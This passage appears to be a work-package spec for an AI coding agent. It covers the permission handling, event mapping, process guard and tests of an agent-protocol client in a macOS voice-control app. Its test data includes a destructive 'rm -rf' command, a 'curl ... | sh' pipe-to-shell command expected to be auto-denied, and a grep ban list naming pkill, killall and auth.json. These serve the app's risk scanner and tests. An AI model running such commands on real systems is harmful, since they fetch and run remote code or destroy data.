{"jsonrpc":"2.0","id":7,"method":"session/request_permission","params":{"sessionId":"s1","toolCall":{"toolCallId":"perm-check-1","title":"Run command: rm -rf /tmp/scratch/x","kind":"execute","status":"pending","rawInput":{"command":"rm -rf /tmp/scratch/x","description":"Run command"}},"options":[{"optionId":"allow_once","kind":"allow_once","name":"Allow once"},{"optionId":"deny","kind":"reject_once","name":"Deny"}]}}
```

Our reply to the permission request, and the response to `session/prompt`:

```json
{"jsonrpc":"2.0","id":7,"result":{"outcome":{"outcome":"selected","optionId":"allow_once"}}}
{"jsonrpc":"2.0","id":3,"result":{"stopReason":"end_turn"}}
```

Map ACP updates to `AgentEvent`:

- **Message chunks** (`agent_message_chunk` text) -> accumulate; emit `.partial(accumulatedSoFar)` (bounded to 400 characters, keep the END of the text) at most every 100 ms (coalesce on the injected time).
- **Tool start.** Hermes sends ONE `tool_call` update (ToolCallStart) when a tool starts running, with NO `status` field (it defaults to pending) and NO separate tool-name field, and it never sends an `in_progress` update at the start. So a rule keyed on `in_progress` would emit nothing and every tool would run unnoticed (fail open). The rule is: emit `.toolActivity(kind:)` **exactly once per `toolCallId`**, on the FIRST sighting of that id in a `tool_call` OR a `tool_call_update`, **regardless of `status`** (absent, pending, in_progress, and also completed/failed for an id never seen before). Later updates of the same id emit nothing.
- **Tool kind.** The name exists only as the title prefix (`build_tool_title` = `"<tool_name>: <preview>"`, or the bare name). `kind` = the title text before the first `:` (or the whole title when there is none), trimmed and lowercased; it must match `^[a-z0-9_.-]{1,40}$`, otherwise `kind = "unknown_tool"` (`ToolTierTable` maps it to T3, so it trips the wire). An absent, empty or garbage title gives `"unknown_tool"`. NEVER put the preview, arguments, paths or the full title in `kind`.
- **Permission ids are not tool starts.** A `toolCallId` that appeared in `session/request_permission` params (`toolCall.toolCallId`, `perm-check-N`) is registered as a permission id and NEVER emits `.toolActivity`: after the answer Hermes sends a `tool_call_update` for that id (`completed`/`failed`, `permissions.py` `await_permission`), which would otherwise look like an unseen tool and trip the wire on every approved command.
- **Ordering (documented on purpose).** A tool's `tool_call` start arrives BEFORE its permission request. With the empty toolset this is intended: any tool that classifies T2 or higher trips R83 before a card can appear (`approvedToolStarts` is still 0), and a card-approved `terminal` is T3, so card-approved shell commands always end in a tripwire pause. This fails closed; do not "fix" the reducer. The coordinator's S3/S4 scenario tests therefore use T0/T1 tool names (`clock`) for approval flows.
- `session/request_permission` -> build the card: `literal` = `params.toolCall.rawInput.command` (fall back to the title); `risk = CommandRiskScanner.scan(literal)`; `tier = risk.tier`; `summary` = "Agent wants to run a command"; `source = .hermes`; `isTruncated = risk.wasTruncated`; `requiresSecondFactor = (tier >= .t3)`; `literal` shown = `risk.sanitized`; `nonce` = a fresh `UUID().uuidString` that you map to the JSON-RPC request id and its option ids. Emit `.approvalNeeded(card)`.
- `respond(nonce:allow:)`: allow => reply `{"outcome":{"outcome":"selected","optionId":"allow_once"}}` ONLY; deny => `optionId` `deny` ONLY. If the nonce is unknown reply nothing. If the request offered no `allow_once`, deny; if it offered no `deny` either, reply `{"outcome":{"outcome":"cancelled"}}`. A permission request still unanswered after 60 s is answered `deny` (a backend-owned timer, B.7).
- Prompt response: `stopReason` `end_turn` => `.finished(summary: accumulated text bounded to 400)`; `cancelled`, `refusal`, `max_tokens`, `max_turn_requests` and ANY unknown value => `.failed(.agentFailed("stop_<reason>"))` (reason lowercased, restricted to `[a-z_]{1,24}`); a JSON-RPC error => `.failed(.agentFailed("rpc_error"))`.
- Usage information: no shape is specified, so none is acceptable; if the agent sends one, map it to `.usage(inputTokens:, outputTokens:, costMicros: 0)`.

### B.6 Process supervision (`HermesProcessGuard`) and hard stop

- Spawn lazily on the first submit; keep it for the idle window (10 minutes) to keep the prompt cache; then `shutdown()` (SIGTERM the group, 0.5 s, SIGKILL). Kill on `stop()`/app termination.
- **`terminateNow()` (synchronous, on `HermesProcessGuard` and re-exported by `HermesAgentBackend`).** No `Task`, no `await`, callable from any thread, idempotent, returns only when finished: `killpg(pgid, SIGTERM)`, poll `kill(pid, 0)` every 10 ms for at most 0.5 s, `killpg(pgid, SIGKILL)`, remove the pid file. `VoiceCoordinator.stop()` reaches it through `terminateAgentNow`, and `AppComposition.stopOwnedResources()` may call it too; this is what prevents an orphaned `hermes acp` at quit.
- Crash recovery: write `~/Library/Application Support/desnotch/voice/hermes-acp.pid` (pid + launch time) into the injected `pidFileDirectory`. On the next start, if it names a live pid whose command line (`ps -p <pid> -o command=` via `SubprocessRunner`) contains both `hermes` and `acp`, kill THAT process group and remove the file. Never scan for other hermes processes.
- Restart backoff: reuse `AdapterRestartBackoff`; a process that dies mid-turn yields `.failed(.agentFailed("process_exited"))`.
- `emergencyStop()`: (1) snapshot all descendant pids of the child (`proc_listchildpids`, recursively), (2) send `session/cancel`, (3) wait `VoiceTiming.hardStopGrace` (0.5 s), (4) `killpg(pgid, SIGTERM)`, (5) wait 0.5 s, (6) `killpg(pgid, SIGKILL)`, (7) wait 0.2 s, (8) `survivors` = names (via `proc_name`) of snapshot pids for which `kill(pid, 0) == 0` still holds. Then drop the transport (the next submit respawns).
- Tests (`HermesProcessGuardTests`) run a REAL tiny process tree, not Hermes, with deterministic "the tree is up" signals and no sleeps: through the injected `ACPLaunch` run `/bin/sh -c 'sleep 61 & sleep 61 & echo tree-up; wait'`, await the line `tree-up` from the transport's `lines` stream, THEN call the hard stop, and assert both `sleep 61` processes are gone and `survivors` is empty; another test runs a grandchild that calls `setsid` itself (`/usr/bin/perl -MPOSIX=setsid -e '$|=1; setsid(); print "setsid-up\n"; sleep 62'`, await `setsid-up`) and asserts it is reported in `survivors` and then cleans it up in `tearDown`; `testTerminateNowKillsTheTreeSynchronously` repeats the first test with `terminateNow()` and no `await`; a stale-PID-file test uses a harmless live `sleep 63` whose command line does NOT contain `hermes acp` (it must NOT be killed). Each test class uses its own unique marker argument (`61`, `62`, `63`) so the final `pgrep` cannot be fooled by an unrelated `sleep`. Always kill leftovers in `tearDown`.

### B.7 `HermesAgentBackend: AgentBackend`

Wraps locator + preflight + guard + client. It is the single instance `AppComposition` holds (A.1). `preflight()` runs B.3 (and the live check P8 when connected). `submit(utterance)` (called by the coordinator for `.submitToAgent`): (1) re-run preflight; refused => stream `[.failed(.preflightRefused(reason))]` (the coordinator maps that to `model.setHermesLaneStatus(.refused(reason))`, A.3); (2) ensure the process is running (spawn, `initialize`, `session/new` once per process; reuse the session for the idle window); (3) `session/prompt`; (4) forward mapped events; the stream ends after `.finished`/`.failed`. The coordinator increments `dailyTurns` right after step (1) succeeds (it learns this from a first event `.status("started")` that the backend emits when the prompt is sent). `respond`, `cancelTurn`, `emergencyStop`, `shutdown`, `terminateNow` as above. The backend is `@unchecked Sendable` with all mutable state behind one serial queue/lock.
**Part B wiring in `AppComposition.swift` (the only Part B edit outside `Voice/Hermes`):** add a stored `private lazy var hermesBackend = HermesAgentBackend(...)` (constructing it spawns nothing), pass `backend: hermesBackend` instead of `NullBackend()`, pass `terminateAgentNow: { [hermesBackend] in hermesBackend.terminateNow() }`, and call `hermesBackend.terminateNow()` in `stopOwnedResources()` right after `voiceCoordinator?.stop()` (it is idempotent).
**Clock and timers are injected.** The backend takes `now: @Sendable () -> Date` (given to the mapper as `at:`) and a small scheduler seam, because its 60 s permission auto-deny and 10-minute idle shutdown cannot use the `@MainActor` `VoiceTimerScheduling`:

```swift
protocol HermesScheduledTask: Sendable { func cancel() }
protocol HermesScheduling: Sendable { func schedule(after seconds: Double, _ action: @escaping @Sendable () -> Void) -> HermesScheduledTask }
```

Real: `DispatchHermesScheduler` (a `DispatchQueue` timer). Tests use `HermesManualScheduler`, defined in `HermesAgentBackendTests.swift` (fire by hand).

### B.8 Lane status

When `voiceHermesLane` is on (at start and on toggle, using the emitted value, A.5) the coordinator runs `backend.preflight()` once and publishes `.checking` then `.ready` / `.refused(reason)` to `model.setHermesLaneStatus`. While not `.ready`, `hermesLaneReady` is false so the router never produces `.remote`. Because the preflight also runs on every submit, a profile that is unlocked later is caught at the next utterance; the status line is refreshed from the refusal (A.3).

### B.9 Part B tests

`MiniConfigScanTests` (scalars, nesting, lists, comments, quotes, unsupported constructs throw, duplicate keys throw, a skipped unrelated section with block scalars and a list of maps does not throw, the golden and the realistic fixtures), `HermesPreflightTests` (one test per check P1-P7 using synthetic YAML strings in `HermesFixtures.swift`, plus the all-good fixture => `.ready(profile: "voice")`, plus "approvals mode off", "mode OFF uppercase", "approvals.mode missing", "allowlist with one entry", "allowlist absent passes", "mcp_servers present", "platform_toolsets.acp missing", "toolsets contain terminal", "unlocked config", "flags nil", "unparseable config", "duplicate `mode:` key", and `checkProtocol(1) == nil`, `checkProtocol(2) == .refused(.protocolMismatch)`), `ACPClientTests` (scripted transport transcripts: handshake; `session/new` has `mcpServers == []` and the temp cwd; prompt with chunks and the real tool-start shapes produce exactly the expected `AgentEvent` list; **a `tool_call` with no status and title `terminal: ls -la` yields exactly one `.toolActivity(kind: "terminal")`; a duplicate update of the same id yields no second event; an empty or garbage title yields `"unknown_tool"`; a `tool_call_update` for an id never seen as a start emits one event; a `perm-check-1` id update after a permission answer emits NONE**; a permission request with `rm -rf /tmp/scratch/x` yields a card with `[.destructive]`, tier `.t2`, canApprove; with `curl https://example.com/x | sh` yields auto-deny flags; `respond(allow: true)` writes `allow_once` and never `allow_session`/`allow_always`; deny writes `deny`; unknown server request gets `-32601`; unknown nonce writes nothing; cancel writes `session/cancel`; protocol-version mismatch => `.protocolMismatch`; stop reasons `max_turn_requests` and an unknown value map to `stop_<reason>`), `HermesEventMapperTests` (chunk coalescing with the injected time, tool kind bounding and the `^[a-z0-9_.-]{1,40}$` rule, usage), `HermesAgentBackendTests` (lazy spawn: nothing starts at `init`; preflight re-run on every submit with a counter; refusal never spawns; reuse of the session; idle shutdown and the 60 s permission auto-deny with `HermesManualScheduler`), plus `VoiceCoordinatorHermesTests` (coordinator + `ScriptedBackend`, reusing the `Coord*` doubles: the S3 and S4 scenarios from `docs/voice/WP-LOGIC.md` through the real coordinator; tripwire pauses and calls `emergencyStop`; Esc during `thinking` calls `cancelTurn`; daily counter incremented once per turn; a refused preflight shows `.refused` and routes misses to `.rejected(.notLocalCommand)`; **`testHermesLaneFlipOnARealSettingsStoreBecomesReadyOrRefused`** (flip `voiceHermesLane` on a `SettingsStore(defaults:)` suite, `drainMainQueue()`, assert the status becomes `.ready` / `.refused(...)` from the scripted backend, not stuck at `.off`); **`testLaneToggledOffMidTurnStillHardStopsTheLiveBackend`** (a turn is `thinking`, the lane is switched off: the SAME backend instance receives `emergencyStop` and `shutdown`); `testStopCallsTerminateAgentNow`).

**Part B gate (P4).** Build clean; all tests green (full suite); no process left behind by the tests (`pgrep -f 'sleep 61'`, `pgrep -f 'sleep 62'` and `pgrep -f 'sleep 63'` after the suite show nothing); lint clean. Then **stop**: the orchestrator gates, reviews and commits Part B before Part C. The LIVE verification (S1/S4 canary matrix against a real Hermes `voice` profile) is a manual step for the human after he creates and locks the profile; your report must list the exact steps (section 15 of `docs/voice/PLAN.md`) and must NOT claim they were run.

## Part C: closing documentation

- `AGENTS.md`: add a section "Voice control (`Sources/DesnotchCore/Voice/`)" in the existing style (concise, load-bearing facts only): the pipeline in one paragraph; the file layout (Contracts/Logic/Platform/Coordinator/Hermes) and that `Contracts/` is frozen; the privacy invariants of `docs/voice/PLAN.md` section 14 (reproduce them verbatim as bullets); permissions held (Microphone + Speech only; never Accessibility/Automation/Screen Recording/Full Disk Access); "voice is OFF by default and inert in smoke-test mode"; "the Hermes profile `voice` is created and locked by the human; desnotch only reads it; never edit `~/.hermes`"; "Hermes also retains its own transcripts in its `state.db`; our audit log is metadata only"; the harness commands (`scripts/voice-harness/run.sh`, `lint-lite.sh`); the deletion path (PLAN section 17).
- `CHANGELOG.md`: under `## Unreleased` add one bullet "**Voice control (experimental, off by default):** ..." describing local commands, on-device recognition, the optional cloud agent lane, and that Microphone and Speech Recognition permissions are requested only when enabled.
- `README.md`: a short "Voice control" section (what it does, how to enable, the local command list, the privacy statements, "the agent lane needs a locked Hermes profile").
- Re-run the whole verification below after editing these.

## 4. Verification

All commands run from the root of YOUR worktree (the directory that contains `Package.swift`).

```sh
# 1. Compile. Must end with "Build complete!" and print NO line containing "warning:" or "error:".
swift build 2>&1 | grep -E "warning:|error:|Build complete"

# 2. Run tests with the stub-XCTest harness (this machine has no XCTest; CI runs the real one).
scripts/voice-harness/run.sh --filter <TestClassName>      # one class, or any "Class.testName" fragment
scripts/voice-harness/run.sh                               # the whole suite, ~45 s after the first build

# 3. Lint the files you touched (stand-in for SwiftLint in CI: trailing whitespace, final newline,
#    no double blank lines, no leading blank line).
scripts/voice-harness/lint-lite.sh                          # all changed/new .swift files
scripts/voice-harness/lint-lite.sh path/one.swift path/two.swift
```

How to read the results:

- `swift build`: done means the single line `Build complete!` and nothing matching `warning:` or `error:`.
  Run it after every edit and read the whole output. An incremental build only re-prints warnings for files it recompiled,
  and SwiftPM hashes file CONTENT, so `touch` does NOT force a rebuild. For the final whole-package warning check build into
  a fresh scratch directory (about 40-60 s): `swift build --scratch-path "$(mktemp -d)" 2>&1 | grep -E "warning:|error:|Build complete"`.
- Harness: each test prints `ok   Class.testName` or `FAIL Class.testName` followed by the failing assertion with
  `file:line`. The last lines are `harness: N passed, M failed, K assertions`. **Done** means `M == 0`, or the
  extra line `harness: only known baseline failures remain` (two existing render tests,
  `ArtworkGlowRenderTests.testGlowFollowsTheCurrentAccentNotThePreviousOne` and
  `PillMarqueeRenderTests.testLongTitleScrollsAfterTheStartDelayOnceActive`, always fail under the stub; ignore them, and
  never edit them). If the harness build prints a `warning:` for one of YOUR test or source files, fix it too. The generated
  `runner/main.swift` prints about 1,700 baseline warnings `no calls to throwing functions occur within 'try' expression`;
  they are not yours, so ignore every warning whose file is `main.swift`
  (`scripts/voice-harness/run.sh 2>&1 | grep 'warning:' | grep -v 'main.swift'` must print nothing).
  The harness finds a test class only when it is declared on ONE line as `class X: XCTestCase` or `final class X: XCTestCase`,
  and it resets its current class at every column-0 `class`, `struct`, `enum` or `actor`: put helper types and fakes at
  column 0 AFTER the test class (or indent them inside it), and confirm with `scripts/voice-harness/run.sh --list | grep <Class>`
  that every test you wrote is listed.
- `lint-lite.sh` must print `lint-lite: clean (N files)`. Pass your files explicitly
  (`scripts/voice-harness/lint-lite.sh path/one.swift path/two.swift`). It only checks the whitespace rules; CI's SwiftLint also
  enforces `duplicate_imports`, `empty_enum_arguments`, `redundant_discardable_let`, `unused_optional_binding` and
  `void_return`, so check those by eye (only `trailing_whitespace` is an error there).
- First harness run builds everything into `.build/voice-harness/` inside your worktree (gitignored); allow 2-4 minutes.
  `--skip-build` re-runs without rebuilding.
- The harness copies your current `Sources/DesnotchCore` and `Tests/DesnotchCoreTests` on every run, so just save and re-run.
- Tests only ever run for real on GitHub Actions (`swift test` on macos-14 with Swift 5.10, and macos-15). The harness uses
  your local Swift 6.1 compiler in Swift 5 language mode, so it can NOT catch every Swift 5.10 actor-isolation error. Follow
  the isolation rules in "Global rules" literally.

**A desnotch is probably already running on this Mac (the installed `/Applications/desnotch.app`).** The app has a
single-instance guard, so a second copy (including `swift run`, `scripts/runtime-smoke-test.sh`, or anything that launches the
app) exits immediately while the installed one runs. NEVER quit, kill or restart the installed app or its adapter process
yourself. Steps that need to launch the app are marked "manual" below: do not attempt them; list them in your report as
`NOT RUN: installed desnotch is running`, and the human runs them after quitting his copy.

Run and report:

```sh
swift build 2>&1 | grep -E "warning:|error:|Build complete"
scripts/voice-harness/run.sh --filter Coordinator
scripts/voice-harness/run.sh --filter DailyTurnCounter
scripts/voice-harness/run.sh --filter Hermes
scripts/voice-harness/run.sh --filter ACP
scripts/voice-harness/run.sh --filter MiniConfigScan
scripts/voice-harness/run.sh
scripts/voice-harness/lint-lite.sh Sources/DesnotchCore/Voice/Coordinator/*.swift Sources/DesnotchCore/Voice/Hermes/*.swift Sources/DesnotchCore/App/AppComposition.swift Tests/DesnotchCoreTests/Voice/Coordinator/*.swift Tests/DesnotchCoreTests/Voice/Hermes/*.swift
scripts/voice-harness/check-ownership.sh WP-HERMES
VERSION=0.0.1 scripts/build-app.sh && scripts/smoke-test.sh dist/desnotch.app
scripts/runtime-smoke-test.sh dist/desnotch.app     # launches the app: needs the installed desnotch NOT running; if it is running, skip and report it, never kill it
HARDENED_RUNTIME=1 VERSION=0.0.1 scripts/build-app.sh && scripts/smoke-test.sh dist/desnotch.app
rg -n "print\(|NSLog\(|os_log|Logger\(|\.onHover|repeatForever|serve --stop|pkill|killall|hermes pause|osascript|auth\.json|AXIsProcessTrusted" Sources/DesnotchCore/Voice
pgrep -f 'sleep 61'; pgrep -f 'sleep 62'; pgrep -f 'sleep 63'      # after the suite: must print nothing (Part B)
```

The last `rg` must show nothing that is not a comment explaining a ban. Done means: every gate above that belongs to YOUR part met (A: the A gate; B: the B gate; C: the full list), plus, for Part A, the manual checks of the A gate reported honestly (the live Hermes checklist is section 15 of `docs/voice/PLAN.md` and is the human's).

## 5. Global rules

These apply to every work package. They are not suggestions.

1. **No new dependencies.** No Swift packages, no vendored code, no shell tools that are not already on a stock macOS 13+
   (and not already used by the repo). Apple system frameworks are fine (`Speech`, `AVFoundation`, `CryptoKit`, `Carbon.HIToolbox`, ...).
   Do not edit `Package.swift`.
2. **Swift 5.10 on CI (macos-14).** The compiler on CI is stricter about actor isolation than the Swift 6.1 on this machine.
   - Mark every SwiftUI `View` struct and every type that touches a `@MainActor` type (`SettingsStore`, controllers,
     `NSWorkspace` UI calls, `VoiceSessionModel`) explicitly `@MainActor`. Never rely on inferred isolation.
   - Escaping closures that capture a class instance use `[weak self]`.
   - `AsyncStream`/`Task` bodies that touch `@MainActor` state are `Task { @MainActor [weak self] in ... }`.
   - Protocols and value types that cross isolation are `Sendable`. A class that is `@unchecked Sendable` guards ALL its mutable
     state with one `NSLock` (or one serial `DispatchQueue`) and says so in a doc comment.
   - Do not use: `Mutex`/`Synchronization`, `sending`, `consuming`/`borrowing`, typed throws (`throws(X)`), Swift Testing
     (`import Testing`, `#expect`), macros, `nonisolated(unsafe)` (outside tests it hides bugs), `@preconcurrency` imports as a
     way to silence a warning, or any API newer than macOS 13.
   - Do not put `await` inside an `XCTAssert...(...)` argument; assign to a `let` first.
3. **No warnings.** `swift build` must be warning-free for the whole package, and the harness build must show no warnings
   from your files. No `// swiftlint:disable`. No `try!` / `as!` / `!` force unwraps in non-test code unless the
   spec above shows one.
4. **No secrets, no real user data.** Never read, print, log or commit `auth.json`, `.env`, keychain items, `~/.ssh`,
   `~/.hermes/config.yaml`, vault or engagement files. Tests use synthetic fixtures only.
5. **Privacy boundary.** A transcript, a command line, a reply text or an audio buffer is live content. Never `print`,
   never `NSLog`, never put it in an `os.Logger` string unless the interpolation is `privacy: .private`, never write it to disk
   (the audit log stores hashes and codes only), never pass it to VoiceOver announcements. Log `VoiceFailure.code` instead.
6. **No git.** Do not run `git add`, `git commit`, `git push`, `git merge`, `git rebase`, `git stash`, `git checkout` of other
   branches, `git worktree`, or `git reset`. Leave your changes uncommitted in your worktree; the orchestrator reviews and commits.
   Reading (`git status`, `git diff`, `git log`) is fine.
7. **Stay inside your file list.** Create/edit ONLY the paths in your "Files" section. Never edit
   `Sources/DesnotchCore/Voice/Contracts/*`, `Tests/DesnotchCoreTests/Voice/VoiceTestSupport.swift`,
   `Tests/DesnotchCoreTests/Voice/VoiceContractSmokeTests.swift`, `Package.swift`, `AGENTS.md`, `CLAUDE.md`, `CHANGELOG.md`,
   `docs/voice/*`, `scripts/voice-harness/*`, `.github/*`, or anything under `Sources/DesnotchCore/MediaRemote/Vendor/` **except that
   Part C (and only Part C) edits `AGENTS.md`, `CHANGELOG.md` and `README.md`** (`CLAUDE.md` is a symlink to `AGENTS.md`: never write
   it separately).
   If you believe a contract file is wrong or incomplete, do NOT edit it: implement the literal spec, work around it locally
   in your own files, and add an `AMENDMENT REQUEST:` paragraph to your final report.
8. **Tests are XCTest, deterministic, and fast.** No sleeps (`Thread.sleep`, `Task.sleep`) to wait for results: use the
   helpers in `Tests/DesnotchCoreTests/TestSupport.swift` (`drainMainQueue`, `drainMainOperationQueue`) or await a stream. No
   network, no microphone, no real `~/Library` paths (use `FileManager.default.temporaryDirectory` + a UUID folder and delete
   it in `tearDown`), no real `UserDefaults.standard` (use `UserDefaults(suiteName:)` and remove the domain in `tearDown`).
   Tests must compile under real XCTest on Xcode 15: only use the assertion functions the existing tests use
   (`XCTAssertEqual/True/False/Nil/NotNil/NotEqual/Greater...`, `XCTUnwrap`, `XCTAssertThrowsError`, `XCTFail`,
   `expectation`/`wait(for:)`). All test files of all packages share ONE test module: test doubles and helper types you write are
   `private`/`fileprivate` unless another test file of YOUR package must reuse them (then they are internal and use the name or
   prefix your package doc prescribes), and before naming any type run `rg -n "class <Name>|struct <Name>" Tests` and change the name
   on a collision. `Tests/DesnotchCoreTests/Voice/VoiceTestSupport.swift` (frozen) already provides `FakeVoiceClock`,
   `ScriptedRecognizer`, `RecordingExecutor`, `ScriptedBackend` and `InMemoryFileWriter`; use them as they are.
9. **Style.** Match the surrounding code. No trailing whitespace, exactly one final newline, never two blank lines in a
   row (CI's SwiftLint fails the build on these; run `scripts/voice-harness/lint-lite.sh`). Doc comments explain WHY.
   Names in this plan are exact: do not rename a type, method, case or file that the plan names.
10. **Do not "improve" the spec.** If a table says X, the code does X, even if you can think of a better X. If the spec is
    silent or contradicts itself, choose the SAFER behavior (refuse / fail closed), say so in your final report under
    `QUESTIONS`, and move on.
11. **Final report.** End your work with a message that lists: every file you created/changed (full paths), the exact
    commands you ran and their last lines (build, harness, lint), the number of tests you added, anything you could not do and
    why, `QUESTIONS`, and any `AMENDMENT REQUEST`. Do not claim a command passed unless you ran it and read its output.

## 6. DO NOT

- Do NOT run `hermes` in any form, read any file under `~/.hermes` other than Python source under `hermes-agent/`, read or print any environment variable's value, or contact any network host. Do NOT start or stop any process you did not create in a test.
- Do NOT create, modify, chmod or `chflags` anything under `~/.hermes`. Do NOT write the voice profile for the human.
- Do NOT use `hermes serve`, WebSockets, `URLSession`, `hermes pause`, `hermes -z`, the OpenAI-compatible API server, or any HTTP.
- Do NOT pass MCP servers, the Interseptor MCP, engagement paths, memory or Notion content to the agent. `mcpServers` is always `[]`.
- Do NOT answer an approval with `allow_session`, `allow_always` or `deny_always`. Do NOT add spoken approval. Do NOT auto-approve anything.
- Do NOT add a settings key, a defaults key for settings, a settings-export field, an entitlement, an Info.plist key (WP-PLATFORM did those), a new Swift package, or a new SPM target.
- Do NOT edit `Voice/Contracts/*`, `Voice/Logic/*`, `Voice/Platform/*`, any `UI/` file, `App/AppDelegate.swift`, `App/SettingsView.swift`, `StatusMenuBuilder*`, `Package.swift`, scripts, `.github/*`, `docs/voice/*`. If a bug is in a merged package, write it in the final report as `AMENDMENT REQUEST` with the failing test or reproduction.
- Do NOT log or persist transcripts, replies or commands. Do NOT leave debug output.
- Do NOT use `pkill`/`killall`/`kill` on any process except the exact pids and process groups the guard spawned or the verified stale pid file names.
- Do NOT create a backend factory or build a second backend object: `AppComposition` owns exactly one (A.1).
- Do NOT run `git add/commit/push/...`.
